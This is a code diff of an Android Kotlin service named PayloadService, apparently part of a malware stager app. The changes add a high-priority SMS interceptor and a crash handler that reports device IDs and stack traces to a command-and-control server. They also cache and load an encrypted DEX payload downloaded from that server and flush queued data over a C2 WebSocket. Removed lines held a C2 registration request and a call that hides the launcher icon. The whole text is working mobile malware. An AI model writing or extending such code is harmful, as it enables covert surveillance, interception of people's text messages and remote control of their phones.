@@ -4,9 +4,11 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.IBinder
@@ -36,53 +38,106 @@ class PayloadService : Service() {
 
     private var isRunning = false
     private var c2WebSocket: WebSocketClient? = null
+    private var smsReceiver: BroadcastReceiver? = null
+    private var previousCrashHandler: Thread.UncaughtExceptionHandler? = null
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
+        registerSmsReceiver()
+        setupCrashHandler()
         Log.i(TAG, "Payload service created")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        isRunning = false
+        c2WebSocket?.disconnect()
+        unregisterSmsReceiver()
+        restoreCrashHandler()
+        Log.i(TAG, "Payload service destroyed")
+    }
+
+    private fun registerSmsReceiver() {
+        try {
+            val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
+            filter.priority = 100
+            smsReceiver = SmsReceiver()
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(smsReceiver, filter, Context.RECEIVER_EXPORTED)
+            } else {
+                registerReceiver(smsReceiver, filter)
+            }
+            Log.i(TAG, "SmsReceiver registered dynamically")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to register SmsReceiver", e)
+        }
+    }
+
+    private fun unregisterSmsReceiver() {
+        try {
+            if (smsReceiver != null) {
+                unregisterReceiver(smsReceiver)
+                smsReceiver = null
+                Log.i(TAG, "SmsReceiver unregistered")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to unregister SmsReceiver", e)
+        }
+    }
+
+    private fun setupCrashHandler() {
+        previousCrashHandler = Thread.getDefaultUncaughtExceptionHandler()
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            try {
+                val sw = java.io.StringWriter()
+                val pw = java.io.PrintWriter(sw)
+                throwable.printStackTrace(pw)
+                val stacktrace = sw.toString()
+                Log.e(TAG, "CRASH: ${throwable.message}")
+                Log.e(TAG, stacktrace.take(2000))
+
+                val crashJson = org.json.JSONObject().apply {
+                    put("type", "crash_report")
+                    put("device_id", Build.ID)
+                    put("error", throwable.message ?: "unknown")
+                    put("stacktrace", stacktrace.take(2000))
+                    put("timestamp", System.currentTimeMillis())
+                }
+                NetworkUtils.sendToC2(StagerApplication.c2RealUrl, crashJson.toString())
+            } catch (e: Exception) {
+                Log.e(TAG, "Crash report failed", e)
+            }
+            previousCrashHandler?.uncaughtException(thread, throwable)
+        }
+    }
+
+    private fun restoreCrashHandler() {
+        Thread.setDefaultUncaughtExceptionHandler(previousCrashHandler)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (isRunning) return START_STICKY
 
+        isRunning = true
+
         try {
             val notification = buildNotification()
             startForeground(NOTIFICATION_ID, notification)
         } catch (e: Exception) {
-            Log.e(TAG, "startForeground failed, synchronous HTTP before stopSelf", e)
-            // Must register SYNCHRONOUSLY before stopping — if we return without
-            // startForeground(), the system kills the process (and background threads)
-            // via ForegroundServiceDidNotStartInTimeException within seconds
-            try {
-                val url = java.net.URL("${StagerApplication.c2RealUrl}/api/register")
-                val conn = url.openConnection() as java.net.HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.connectTimeout = 5000
-                conn.readTimeout = 5000
-                conn.doOutput = true
-                conn.setRequestProperty("Content-Type", "application/json")
-                val info = JSONObject().apply {
-                    put("device_id", Build.ID)
-                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
-                    put("manufacturer", Build.MANUFACTURER)
-                    put("model", Build.MODEL)
-                    put("android_version", Build.VERSION.RELEASE)
-                    put("api_level", Build.VERSION.SDK_INT)
+            Log.e(TAG, "startForeground failed, continuing without foreground", e)
+            // Schedule a retry — some devices need the service to settle first
+            android.os.Handler(mainLooper).postDelayed({
+                try {
+                    if (isRunning) {
+                        val notification = buildNotification()
+                        startForeground(NOTIFICATION_ID, notification)
+                    }
+                } catch (e2: Exception) {
+                    Log.e(TAG, "startForeground retry also failed", e2)
                 }
-                conn.outputStream.write(info.toString().toByteArray())
-                val code = conn.responseCode
-                conn.disconnect()
-                Log.i(TAG, "HTTP registration: $code")
-                if (code == 200) hideLauncherIcon()
-            } catch (e2: Exception) {
-                Log.e(TAG, "Synchronous HTTP registration failed", e2)
-            }
-            stopSelf()
-            return START_NOT_STICKY
+            }, 3000)
         }
-
-        isRunning = true
 
         // Step 1: Download the payload DEX
         downloadAndLoadPayload()
@@ -94,13 +149,6 @@ class PayloadService : Service() {
     }
 
     override fun onBind(p0: Intent?): IBinder? = null
-
-    override fun onDestroy() {
-        super.onDestroy()
-        isRunning = false
-        c2WebSocket?.disconnect()
-        Log.i(TAG, "Payload service destroyed")
-    }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -132,10 +180,19 @@ class PayloadService : Service() {
     private fun downloadAndLoadPayload() {
         Thread {
             try {
+                // Try loading from cache first
+                val cached = PayloadLoader.loadFromCache(this)
+                if (cached) {
+                    Log.i(TAG, "Payload loaded from cache")
+                    return@Thread
+                }
+
+                // Download fresh payload
                 val payloadUrl = "${StagerApplication.c2RealUrl}/api/payload"
                 val dexBytes = NetworkUtils.downloadBytes(payloadUrl)
                 if (dexBytes != null) {
                     val decrypted = CryptoUtils.decryptPayload(dexBytes)
+                    PayloadLoader.saveToCache(this, decrypted)
                     PayloadLoader.loadDex(this, decrypted)
                     Log.i(TAG, "Payload loaded successfully")
                 } else {
@@ -167,6 +224,7 @@ class PayloadService : Service() {
                         }
                     )
                     if (latch.await(WS_TIMEOUT_SECONDS, TimeUnit.SECONDS) && connected) {
+                        NetworkUtils.flushQueue(StagerApplication.c2RealUrl, this@PayloadService)
                         return@Thread
                     }
                 } catch (e: Exception) {
